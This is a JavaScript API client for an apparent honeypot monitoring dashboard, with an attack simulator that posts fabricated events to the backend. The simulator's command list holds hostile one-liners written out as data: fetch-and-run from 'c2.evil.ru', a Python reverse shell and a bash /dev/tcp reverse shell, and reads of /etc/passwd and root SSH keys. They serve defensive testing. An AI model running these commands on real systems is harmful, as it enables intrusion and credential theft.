// ─── API Service ─────────────────────────────────────────────────────────────
// Connects to: https://kurukshetra-backend.onrender.com
// All calls go through this centralized client with error handling.

const BASE_URL = import.meta.env.VITE_API_URL || 'https://kurukshetra-backend.onrender.com';

async function apiFetch(path, options = {}) {
  const url = `${BASE_URL}${path}`;
  const res = await fetch(url, {
    headers: { 'Content-Type': 'application/json', ...options.headers },
    ...options,
  });
  if (!res.ok) {
    const text = await res.text().catch(() => '');
    throw new Error(`[${res.status}] ${path}: ${text}`);
  }
  // Some endpoints return empty body on success
  const ct = res.headers.get('content-type') || '';
  if (ct.includes('application/json')) return res.json();
  return null;
}

// ─── Health ──────────────────────────────────────────────────────────────────
export const checkHealth = () => apiFetch('/health');

// ─── Dashboard ───────────────────────────────────────────────────────────────
export const fetchDashboardSummary = () => apiFetch('/api/dashboard/summary');

// ─── Attacks / Sessions ──────────────────────────────────────────────────────
export const fetchAttacks = () => apiFetch('/api/attacks');
export const fetchSessionDetails = (id) => apiFetch(`/api/sessions/${id}`);
export const containSession = (id) =>
  apiFetch(`/api/sessions/${id}/contain`, { method: 'POST' });

// ─── IOCs ────────────────────────────────────────────────────────────────────
export const fetchIOCs = () => apiFetch('/api/iocs');

// ─── Attacker DNA ────────────────────────────────────────────────────────────
export const fetchAttackers = () => apiFetch('/api/attackers');

// ─── MITRE ATT&CK ────────────────────────────────────────────────────────────
export const fetchMitre = (sessionId) =>
  apiFetch(sessionId ? `/api/mitre/${sessionId}` : '/api/mitre');

// ─── Reports ─────────────────────────────────────────────────────────────────
export const fetchReport = (sessionId) => apiFetch(`/api/reports/${sessionId}`);

// ─── One-Click Simulator ─────────────────────────────────────────────────────
// Sends a realistic honeypot attack event to the live backend so the dashboard
// fills with live data instantly — no terminal access needed.
const SIM_SERVICES = ['ssh', 'http', 'ftp'];
const SIM_IPS = [
  '185.220.101.45', '23.129.64.101', '45.142.212.100',
  '194.165.16.77',  '62.102.148.69', '109.70.100.23',
  '178.175.148.217','91.108.4.40',   '198.96.155.3',
];
const SIM_COMMANDS = [
  'cat /etc/passwd', 'wget http://malware.xyz/shell.sh',
  'curl -s http://c2.evil.ru/payload | bash',
  'python3 -c "import socket,os,pty;s=socket.socket();s.connect((\'10.10.10.10\',4444));os.dup2(s.fileno(),0)"',
  'nmap -sV 192.168.1.0/24', 'ssh-keygen -t rsa && cat /root/.ssh/id_rsa',
  'sudo su -', '/bin/bash -i >& /dev/tcp/185.220.101.45/4444 0>&1',
  'ls /root', 'id && whoami && hostname',
];
const SIM_UAS = [
  'Mozilla/5.0 zgrab/0.x', 'curl/7.68.0', 'python-requests/2.28',
  'masscan/1.3', 'Nikto/2.1.6', 'Go-http-client/1.1',
];

function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }

export async function runAttackSimulation() {
  const service = pick(SIM_SERVICES);
  const ip = pick(SIM_IPS);
  const sessionId = `sim-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`;

  const payload = {
    session_id: sessionId,
    source_ip: ip,
    service,
    timestamp: new Date().toISOString(),
    event_type: service === 'ssh' ? 'LOGIN_ATTEMPT' : 'HTTP_REQUEST',
    data: service === 'ssh'
      ? { username: pick(['root','admin','ubuntu','pi','user']), command: pick(SIM_COMMANDS) }
      : { method: 'GET', path: pick(['/admin','/wp-login.php','/.env','/.git/config','/phpmyadmin']), user_agent: pick(SIM_UAS) },
  };

  return apiFetch('/api/events', { method: 'POST', body: JSON.stringify(payload) });
}
